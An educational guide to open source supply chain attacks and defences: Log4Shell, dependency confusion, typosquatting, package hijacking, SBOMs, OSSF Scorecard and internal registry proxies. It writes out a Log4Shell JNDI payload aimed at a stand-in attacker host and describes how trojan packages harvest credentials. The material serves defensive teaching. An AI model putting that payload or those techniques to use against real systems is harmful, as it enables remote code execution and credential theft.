# Supply Chain Security: How Open Source Dependencies Become Attack Vectors

---

> Ever wondered how a logging library brought down half the internet in 2021? How an 18-year-old researcher got paid $130,000 by Microsoft, Apple, and Uber just by uploading packages with the right names? How malware gets into your project without you touching a single malicious file yourself?

**You're about to find out — and after this, you will never run `npm install` or `pip install` the same way again.**

---

## What's Inside This File

> We are exploring how the open source supply chain gets attacked — the real incidents, the exact techniques, and what you actually need to check before pulling in a dependency.

```
03-supply-chain-security.md
│
├── What a Software Supply Chain Is
│   ├── Why the term "supply chain" applies to software
│   ├── The dependency explosion — how we got here
│   └── Why this became critical in the last decade
│
├── Log4Shell — The Incident That Changed Everything
│   ├── What Log4j is and why it was everywhere
│   ├── What JNDI injection actually is — step by step
│   ├── The transitive dependency problem
│   └── The blast radius — what actually happened
│
├── Attack Taxonomy — Every Type Explained
│   ├── Dependency confusion — Alex Birsan, $130k
│   ├── Typosquatting — how attackers name packages
│   ├── RepoJacking — what happens when maintainers disappear
│   ├── Package hijacking — taking over abandoned packages
│   ├── PR sneaking — malicious code hidden in large diffs
│   └── Trojan packages — malware as legitimate tools
│
├── SBOM — What It Is and Why It Matters
│   ├── US Executive Order 14028
│   ├── EU Cyber Resilience Act
│   └── SPDX vs CycloneDX vs SWID
│
├── How to Evaluate a Dependency Before Using It
│   ├── License check
│   ├── Security history
│   ├── Community health — bus factor
│   └── OSSF Scorecard — what it actually measures
│
└── Approved Repository Architecture
    ├── Artifactory and Nexus as proxy
    └── The left-pad incident — what it proved
```

---

## What a Software Supply Chain Is

The term "supply chain" comes from manufacturing. A car manufacturer does not build every component — they source parts from hundreds of suppliers. Each supplier sources materials from their own suppliers. A flaw anywhere in that chain — a faulty bolt from a third-tier supplier — can affect the final product even though the car manufacturer never touched that bolt.

Software works the same way. When you write an application, you do not write everything from scratch. You pull in libraries. Those libraries pull in their own libraries. Those libraries pull in more. By the time your application runs, it contains code written by hundreds or thousands of people you have never heard of, maintained to standards you have never reviewed, hosted on infrastructure you do not control.

```
Your application
└── Library A  (you chose this)
    └── Library B  (you may know this)
        └── Library C  (you probably do not know this)
            └── Library D  (almost nobody knows this)
                └── written by one person
                    maintained in spare time
                    last updated three years ago
                    downloaded 50 million times per week
```

This is not hypothetical. This is Log4j.

### Why the Dependency Explosion Happened

In the 1990s, software had few external dependencies. You wrote your code, linked against the standard library, shipped a binary. The tools to share and consume libraries did not exist at scale.

Then package managers appeared. npm in 2010. pip had been growing since 2008. RubyGems, Maven, Cargo. Suddenly pulling in a library was one command. The friction disappeared.

When friction disappears, usage explodes. npm today hosts over 2.5 million packages. PyPI hosts over 500,000. The average Node.js application has over 1,000 transitive dependencies. A single `npm install` for a simple project can pull in hundreds of packages from hundreds of different maintainers.

```
npm dependency growth:
├── 2010 — npm launches, hundreds of packages
├── 2014 — 100,000 packages
├── 2017 — 500,000 packages
├── 2020 — 1,500,000 packages
└── 2024 — 2,500,000+ packages

Average transitive dependencies per project:
├── Small Node.js app    — 300-500 packages
├── Medium React app     — 700-1,000 packages
├── Large enterprise app — 1,000-3,000 packages
└── Each one is a potential attack surface
```

The same property that makes open source powerful — anyone can contribute, anyone can publish — makes it attackable. There is no vetting process for publishing to npm or PyPI. Anyone can upload anything.

---

## Log4Shell — The Incident That Changed Everything

On December 9, 2021, a security researcher published a proof-of-concept exploit for a vulnerability in Apache Log4j 2. Within 24 hours, hundreds of millions of devices were being actively attacked. Within a week, it had been called the worst security vulnerability in the history of the internet.

To understand why, you need to understand what Log4j is, what JNDI injection does, and how a logging library had any of this capability in the first place.

### What Log4j Is

Log4j is a Java logging library published by the Apache Software Foundation. Its job is simple: when your application wants to record something — a user logged in, an error occurred, a transaction completed — Log4j writes that message to a file or console.

It is the most widely used Java logging library in the world. It is embedded in thousands of products — Minecraft, Apple iCloud, Amazon AWS services, enterprise software from every major vendor, industrial control systems, medical devices, banking infrastructure.

Nobody thinks about their logging library. It just works. That is the point. And that invisibility is exactly what made this so dangerous.

### What JNDI Injection Actually Is

Log4j had a feature: it could look up values from external sources when formatting log messages. The syntax was `${prefix:name}`. If Log4j saw `${jndi:ldap://example.com/a}` in a message it was logging, it would make a network request to `ldap://example.com/a` and substitute the result into the log message.

JNDI is the Java Naming and Directory Interface — a Java API for looking up resources over a network. The LDAP protocol is one of the sources JNDI can query. This feature was added to Log4j in 2013 for legitimate purposes — looking up configuration values from directory services.

Here is what the attack looks like step by step:

```
STEP 1: Attacker finds any input that gets logged
        ├── HTTP User-Agent header
        ├── Search query
        ├── Username field
        ├── X-Forwarded-For header
        └── Literally any string that touches a log statement

STEP 2: Attacker sends the payload
        └── Input = ${jndi:ldap://attacker.com/exploit}

STEP 3: Application logs the input (normal behaviour)
        └── Log4j receives the string to log

STEP 4: Log4j sees the ${jndi:...} syntax
        └── Treats it as a lookup expression

STEP 5: Log4j makes a network request to attacker.com
        └── Reaches out FROM THE SERVER to attacker

STEP 6: Attacker's LDAP server responds with a Java class
        └── Points to a malicious Java object

STEP 7: Log4j loads and executes the Java class
        └── Attacker now has REMOTE CODE EXECUTION
            on the target server
```

Remote code execution means the attacker can run any command on the server. Install ransomware. Exfiltrate data. Create backdoors. Move laterally through the network. The attack required no authentication, no special access, no prior knowledge of the target system. Send a string. Own the server.

### The Transitive Dependency Problem

The reason this was catastrophic — and not just a bad vulnerability in one library — was the transitive dependency problem.

Most of the affected systems did not know they were using Log4j. They were using a framework that used a library that used another library that used Log4j. The dependency was three, four, five levels deep.

```
Affected system example:

Enterprise Java Application
└── uses Spring Boot
    └── uses Spring Framework
        └── uses Apache Solr (optional component)
            └── uses Log4j 2
                └── VULNERABLE

The developers of the Enterprise Java Application:
├── Knew they used Spring Boot
├── May have known Spring Boot used Spring Framework
├── Probably did not know about Apache Solr
└── Almost certainly did not know about Log4j 2
    at that dependency depth
```

Organizations spent weeks auditing their entire software portfolios trying to find every place Log4j appeared. Many found it in places they had not touched in years — products built on third-party components whose dependency trees nobody had ever mapped.

### The Blast Radius

```
Log4Shell impact within 72 hours of disclosure:
├── Over 100 distinct threat actors exploiting it
├── Nation-state actors: Iran, China, North Korea, Turkey
├── Ransomware groups deploying payloads immediately
├── Crypto miners installed on vulnerable systems at scale
└── Estimated 100+ million devices exposed

Who was vulnerable:
├── Apple iCloud
├── Amazon AWS (multiple services)
├── Microsoft Azure
├── Cloudflare
├── Twitter
├── Steam
├── Minecraft (how the researcher originally found it)
├── Thousands of enterprise products
└── Embedded systems — routers, cameras, industrial gear
    (many still unpatched today)
```

The US Cybersecurity and Infrastructure Security Agency called it "one of the most serious vulnerabilities" they had ever seen. The director of CISA said she was "deeply concerned." Governments issued emergency directives. Companies pulled engineers off vacation to patch.

All of this from a logging library. A component that just writes messages to a file.

---

## Attack Taxonomy — Every Type Explained

Log4Shell was a vulnerability in legitimate software. But most supply chain attacks are not about finding bugs — they are about inserting malicious code into the supply chain directly. Here is every major technique.

---

### Dependency Confusion — Alex Birsan and the $130,000 Experiment

In 2021, security researcher Alex Birsan published a paper describing a new attack technique he had tested against major technology companies. He called it dependency confusion. He received bug bounty payments totalling over $130,000 from Microsoft, Apple, PayPal, Shopify, Netflix, Yelp, Tesla, Uber, and others.

The technique exploited how package managers resolve dependency names when both a public registry and a private registry exist.

```
How large companies use private packages:
├── Company builds internal library: @company/internal-auth
├── Hosts it on private npm registry (Artifactory, etc.)
├── Developers run: npm install @company/internal-auth
└── npm checks private registry first, installs it

The confusion attack:
├── Attacker finds internal package name
│   └── Often visible in job postings, error messages,
│       public code, accidentally committed lock files
│
├── Attacker publishes SAME NAME to public npm
│   └── With a much higher version number
│       internal: v1.0.0 → attacker publishes: v9.0.0
│
├── Package manager resolves dependency
│   └── Sees higher version on public registry
│   └── Installs attacker's package instead
│
└── Attacker's code runs in company infrastructure
    ├── Birsan's version just phoned home (PoC)
    └── Malicious version could do anything
```

Birsan tested this against Apple, Microsoft, Uber, and dozens of others. Every one of them was vulnerable. He acted ethically — his payload just sent a network request to prove execution. A malicious actor would have had remote code execution inside some of the largest companies in the world.

The fix requires package managers to be explicitly configured to prefer private registries and to not fall back to public ones for private package names. Many companies had not done this.

---

### Typosquatting — How Attackers Name Packages

Typosquatting is the simplest attack: publish a malicious package with a name that looks like a legitimate popular package. Wait for developers to mistype.

```
Real package      Typosquatted package
----------------------------------
requests          request (no s)
lodash            lodahs (transposed letters)
moment            momnet
express           expres
react             recat
urllib3           urlib3
                  urllib (missing 3)
```

This works because:
- Developers type fast
- Autocomplete does not always work for package names
- CI/CD pipelines running automated installs do not check spelling
- The malicious package exists for months before anyone notices

Real incidents:

```
2017 — crossenv (not cross-env)
├── Malicious package published to npm
├── Downloaded thousands of times before detection
└── Collected environment variables including API keys

2018 — event-stream attack
├── Not typosquatting but same trust exploitation
├── New maintainer added malicious code to popular package
├── Targeted specifically at Bitcoin wallet software
└── Downloaded 8 million times before discovery

2021 — PyPI malicious packages
├── 8 packages targeting AWS credentials
├── Names: loglib-modules, pyg-modules, pygrata, etc.
├── Installed credential harvesting code
└── Exfiltrated AWS access keys to attacker server
```

---

### RepoJacking — What Happens When Maintainers Disappear

GitHub allows users to change their username. When a username changes, the old username becomes available again. If a package on npm, PyPI, or another registry still points to the old GitHub URL — for documentation, for source code, for install instructions — and someone claims that old username, they now control what people see when they follow those links.

More dangerously: if the package registry still allows publishing under that account name, the new owner of the username can publish malicious updates.

```
RepoJacking sequence:
│
├── Developer publishes popular package
│   └── GitHub: github.com/originaldev/popular-lib
│
├── Developer changes username or deletes account
│   └── github.com/originaldev becomes available
│
├── Attacker claims github.com/originaldev
│
├── Attacker creates popular-lib repository
│
└── Targets:
    ├── Anyone cloning from the GitHub URL directly
    ├── Documentation links pointing to the old repo
    ├── Install scripts that pull from GitHub
    └── Package registry if account linking exists
```

A 2022 study found over 36,000 GitHub repositories vulnerable to RepoJacking at the time of publication. These were packages with millions of downloads whose source URLs pointed to usernames that had been abandoned and were available for re-registration.

---

### Package Hijacking — Taking Over Abandoned Packages

Many packages on npm and PyPI are abandoned. The maintainer moved on, the project became irrelevant, or the person simply stopped maintaining it. The package still exists. It still has users. It still receives downloads.

Some registries allow transferring package ownership. In some cases, attackers have:
- Contacted maintainers of popular abandoned packages asking to "take over maintenance"
- Exploited account recovery processes to gain access to dormant accounts
- Found maintainer email addresses that no longer existed and registered them

Once they have publishing rights, they push an update. Every user who has the package set to auto-update or runs a fresh install gets the malicious version.

```
event-stream (2018) — the most famous case:
│
├── Popular Node.js utility, 2M downloads/week
├── Original maintainer (dominictarr) inactive for years
├── New contributor offered to help maintain it
├── dominictarr transferred ownership
│
├── New owner published update with added dependency:
│   └── flatmap-stream — encrypted malicious payload
│
├── Payload targeted specifically:
│   └── copay — a Bitcoin wallet application
│       └── Attempted to steal private keys and funds
│
└── Discovered after 2.5 months
    └── Downloaded approximately 8 million times
```

---

### PR Sneaking — Malicious Code Hidden in Large Diffs

Open source projects accept pull requests from the public. A sophisticated attacker can submit a legitimate-looking PR that contains a small malicious change buried in a large diff.

```
PR sneaking technique:
│
├── Attacker builds credibility first
│   └── Small genuinely helpful contributions
│       Typo fixes, doc improvements, minor bugs
│
├── Attacker submits large PR
│   └── 500+ line diff with legitimate refactoring
│   └── Hidden in the middle: 3 lines of malicious code
│       ├── Single character off from correct code
│       ├── Logic bomb — activates under specific conditions
│       └── Obfuscated as "performance optimization"
│
├── Reviewer checks the main logic
│   └── Refactoring looks correct
│   └── The 3 malicious lines look like minor utility code
│
└── PR merged, malicious code ships in next release
```

This attack is particularly dangerous for maintainers of popular projects who receive dozens of PRs. Reviewing every line of every large PR carefully is genuinely difficult when you are doing it as a volunteer in your spare time.

The Linux kernel had an incident in 2021 where researchers from the University of Minnesota submitted intentionally vulnerable patches as part of a study on kernel security. The patches were caught, but the incident triggered a significant discussion about how the kernel reviews contributions from unknown submitters.

---

### Trojan Packages — Malware Disguised as Legitimate Tools

The most direct attack: publish a package that does something useful and also something malicious. The useful functionality gets the package downloaded. The malicious functionality does the damage.

```
Common trojan package patterns:
│
├── Credential harvesting
│   └── Package installs fine, works as advertised
│   └── Also reads env vars, .aws/credentials,
│       .ssh/keys, .npmrc tokens → sends to attacker
│
├── Cryptomining
│   └── Package installs fine
│   └── Installs background process that mines crypto
│       using victim's CPU
│
├── Backdoor installation
│   └── Package installs fine
│   └── Adds persistent backdoor for remote access
│
└── Targeted attacks
    └── Package checks if running in specific environment
        (target company's CI, specific cloud provider)
        └── Only activates payload in target environment
            └── Much harder to detect in testing
```

---

## SBOM — What It Is and Why It Matters

A **Software Bill of Materials** is an inventory of every component in a piece of software — every library, every framework, every dependency at every level, with their versions, their licenses, and their known vulnerabilities.

The concept comes directly from manufacturing. A car manufacturer maintains a bill of materials for every vehicle — every part, every supplier, every specification. If a safety recall is issued for a specific bolt from a specific supplier, the manufacturer can immediately identify which vehicles contain that bolt.

Software had no equivalent. When Log4Shell was disclosed, organizations spent weeks trying to answer a simple question: do we use Log4j? Many could not answer it for days.

### US Executive Order 14028

In May 2021 — seven months before Log4Shell, as if in preparation — US President Biden signed Executive Order 14028 on Improving the Nation's Cybersecurity. Section 4 required that any software sold to the US federal government must come with a software bill of materials.

```
EO 14028 SBOM requirements:
├── Any software vendor selling to US federal government
├── Must provide SBOM with delivery
├── SBOM must include:
│   ├── All direct dependencies
│   ├── All transitive dependencies
│   ├── Component names and versions
│   ├── Supplier names
│   └── Known vulnerabilities
└── Enforced through procurement contracts
```

This was significant because the US federal government is one of the largest software buyers in the world. Requirements for federal procurement tend to propagate into industry standards. Companies that built SBOM processes for federal contracts applied them to their entire software portfolio.

### EU Cyber Resilience Act

The EU went further. The **Cyber Resilience Act**, passed in 2024, applies to any product with digital elements sold in the EU market. It requires manufacturers to maintain SBOMs, patch known vulnerabilities within defined timelines, report actively exploited vulnerabilities to ENISA within 24 hours, and support products with security updates for their expected lifetime.

```
EU CRA scope:
├── Applies to: any product with digital elements sold in EU
│   ├── Software products
│   ├── Hardware with embedded software
│   ├── IoT devices
│   └── Industrial control systems
│
├── Requirements:
│   ├── SBOM for all components
│   ├── Vulnerability patching within defined SLAs
│   ├── Active exploitation reporting within 24 hours
│   └── Security updates for product lifetime
│
└── Non-compliance:
    ├── Fines up to €15M or 2.5% of global turnover
    └── Products can be banned from EU market
```

Open source projects that are not commercial products have a specific exemption — you are not required to comply just because you publish open source software. But companies that incorporate open source into commercial products are fully in scope.

### SPDX vs CycloneDX vs SWID

Three formats have emerged for representing SBOMs. They are not interchangeable and the choice matters depending on your context.

```
SPDX (Software Package Data Exchange):
├── Created by: Linux Foundation
├── Primary focus: License compliance
├── Strength: License and copyright information
├── Weakness: Less rich vulnerability data
├── Format: JSON, YAML, RDF, tag-value
└── Used by: Linux kernel, many open source projects

CycloneDX:
├── Created by: OWASP
├── Primary focus: Security and vulnerability management
├── Strength: CVE references, VEX (exploitability)
├── Weakness: Less license detail than SPDX
├── Format: JSON, XML
└── Used by: Security pipelines, DevSecOps

SWID (Software Identification Tags):
├── Created by: ISO/IEC standard
├── Primary focus: Asset inventory and management
├── Strength: Enterprise asset management integration
├── Weakness: Less community adoption in open source
├── Format: XML
└── Used by: Enterprise IT asset management
```

In practice: if your primary concern is license compliance, SPDX. If your primary concern is vulnerability management, CycloneDX. Many organizations generate both. Tools like Syft, FOSSA, and Anchore can generate either format from a container image or source repository.

---

## How to Evaluate a Dependency Before Using It

Adding a dependency is a decision with long-term consequences. The package that solves your problem today is the package you are responsible for tomorrow — its vulnerabilities, its license changes, its abandonment.

Here is a systematic evaluation framework:

---

### License Check

This comes first because a license incompatibility can make a dependency unusable regardless of its security posture.

```
License evaluation:
│
├── Identify the license
│   └── Check LICENSE file, package metadata, SPDX id
│
├── Check compatibility with your project
│   └── See 02-licenses-the-complete-picture.md
│
├── Check for license changes in version history
│   └── Has the maintainer ever changed the license?
│   └── BSL or SSPL switch in recent releases?
│
└── Check contributor license agreements
    └── CLA that could allow relicensing?
```

---

### Security History

```
Security evaluation:
│
├── Search CVE database for known vulnerabilities
│   └── nvd.nist.gov — search by package name
│
├── Check how quickly past vulnerabilities were patched
│   └── Days? Weeks? Months? Never?
│
├── Look at the project's security policy
│   └── SECURITY.md — do they have one?
│   └── How do they handle responsible disclosure?
│
├── Check if project participates in security audits
│   └── OSTIF, Trail of Bits, Cure53 — audit reports?
│
└── Check for active exploitation
    └── CISA Known Exploited Vulnerabilities catalog
        └── kev.cisa.gov
```

---

### Community Health — Bus Factor

The bus factor is the number of contributors who would need to be hit by a bus to make the project unmaintainable. A bus factor of 1 means one person knows everything. If that person disappears, the project is effectively dead.

```
Community health indicators:
│
├── Number of active contributors
│   └── Active in last 6-12 months, not total ever
│
├── Commit frequency
│   └── Actively maintained?
│   └── Or last commit was 3 years ago?
│
├── Issue response time
│   └── Are issues being responded to?
│   └── Are bugs getting fixed?
│
├── Bus factor assessment
│   └── GitHub insights → contributors graph
│   └── One person at 90%+ of commits: bus factor = 1
│
├── Organizational backing
│   └── Company or foundation maintaining this?
│   └── Or one person's side project?
│
└── Downstream dependents
    └── How many projects depend on this?
    └── High dependents = more likely to be maintained
        └── Also = higher value attack target
```

---

### OSSF Scorecard

The **Open Source Security Foundation Scorecard** is an automated tool that evaluates open source projects against a set of security best practices and produces a score from 0 to 10.

```
OSSF Scorecard checks:
│
├── Code Review
│   └── Is every commit reviewed before merging?
│
├── Branch Protection
│   └── Main branch protected from direct pushes?
│
├── CI Tests
│   └── Automated tests running on every PR?
│
├── Fuzzing
│   └── Automated fuzz testing running?
│
├── Static Analysis
│   └── CodeQL or similar tools running?
│
├── Dependency Update Tool
│   └── Dependabot or Renovate keeping deps current?
│
├── Signed Releases
│   └── Release artifacts cryptographically signed?
│
├── Token Permissions
│   └── GitHub Actions tokens minimally scoped?
│
├── Pinned Dependencies
│   └── CI deps pinned to specific hashes?
│   └── (Hashes — not just versions, which can be spoofed)
│
└── Dangerous Workflow
    └── Any workflow with dangerous permission patterns?
```

Run it against any project:

```
# Install
go install github.com/ossf/scorecard/v4/cmd/scorecard@latest

# Run against a project
scorecard --repo=github.com/owner/repo

# Score per check and overall score
# Below 5: significant security concerns
# 7+: reasonable security posture
# 9+: strong security practices
```

Projects with low scores are not necessarily malicious — many are just maintained by individuals who have not implemented these practices. But a low score means the project has not built the defenses that would catch a supply chain attack if one was attempted.

---

## Approved Repository Architecture

Large organisations do not let developers pull packages directly from the public internet. They run an internal proxy — a mirror of the public registries that is under their control.

### Artifactory and Nexus

**JFrog Artifactory** and **Sonatype Nexus** are the two dominant solutions. They sit between your developers and the public registries:

```
Without proxy (what most individuals do):
Developer → npm install → npmjs.com → package downloaded

With proxy (what large organisations do):
Developer → npm install → Internal Artifactory/Nexus
                          ├── Cached? → Return it
                          └── Not cached?
                              ├── Fetch from npmjs.com
                              ├── Run security scan
                              ├── Check license compliance
                              ├── Check approved list
                              └── Cache and return (or reject)
```

This architecture provides:

```
Benefits of internal proxy:
│
├── Security scanning before packages enter
│   └── Catch known malicious packages before install
│
├── License compliance enforcement
│   └── Block incompatible licenses automatically
│
├── Dependency confusion prevention
│   └── Internal packages always take precedence
│   └── Public fallback disabled for internal names
│
├── Reproducible builds
│   └── Cached versions do not change
│   └── What exists today still exists tomorrow
│
└── Audit trail
    └── Every package pull is logged
    └── Know exactly what version was used in every build
```

### The Left-Pad Incident — What It Proved

In March 2016, a developer named Azer Koçulu unpublished 273 packages from npm, including one called left-pad. Left-pad was 17 lines of code that padded a string with characters on the left side.

Thousands of projects depended on left-pad. Including React. Including Babel. Immediately after it was unpublished, builds across the internet started failing. CI pipelines broke. Deployments stopped. Companies that had nothing to do with Azer Koçulu's dispute with npm were suddenly unable to ship software.

```
left-pad — 17 lines of code:
│
function leftPad(str, len, ch) {
  str = String(str);
  var i = -1;
  if (!ch && ch !== 0) ch = ' ';
  len = len - str.length;
  while (++i < len) {
    str = ch + str;
  }
  return str;
}
│
├── Depended on by: React, Babel, thousands of others
├── Time to break the internet: ~11 min after unpublish
└── Fix: npm overrode the unpublish, restored the package
    └── But the lesson was permanent
```

The lesson was not about left-pad specifically. It was about architectural fragility. A supply chain that depends on packages that can be removed, renamed, or changed by their maintainers at any time is a supply chain that can be broken — accidentally or deliberately — at any time.

An internal proxy with cached packages would have been immune to this incident. The cached version of left-pad would still have been available regardless of what happened on npmjs.com.

---

## The Pattern Across All of This

Every attack in this file exploits the same property: the open source supply chain is built on trust at a scale that makes verification impossible without tooling.

```
The trust chain that gets exploited:
│
├── You trust your direct dependencies
│   └── (You chose them, you reviewed them)
│
├── You implicitly trust their dependencies
│   └── (You did not choose them, may not know them)
│
├── You implicitly trust their deps' dependencies
│   └── (Almost certainly unknown to you)
│
└── You implicitly trust every maintainer,
    every contributor,
    every package registry,
    every CDN,
    along the entire chain
```

The mitigations are not about eliminating trust — that is impossible. They are about making trust explicit, documented, and verifiable:

- **SBOM** makes the dependency tree visible so you know what you are trusting
- **OSSF Scorecard** makes the security posture of each dependency measurable
- **Internal proxy** makes the supply chain controlled and reproducible
- **Dependency pinning to hashes** makes packages immutable once approved
- **Security scanning** catches known-bad packages before they enter

None of these eliminate the risk. Log4Shell was in a legitimate, well-maintained project with no malicious intent. The dependency confusion attack hit companies with sophisticated security teams. The left-pad incident hit React.

The point is not to achieve perfect security. The point is to know what you are running and to have enough visibility that when something goes wrong, you can find it fast.

---

> **Now read the next file — because knowing your dependencies are clean only matters if you can actually get your contribution approved.**
> **The contribution process is more complex than you think → [04-contribution-process-reality.md](04-contribution-process-reality.md)**
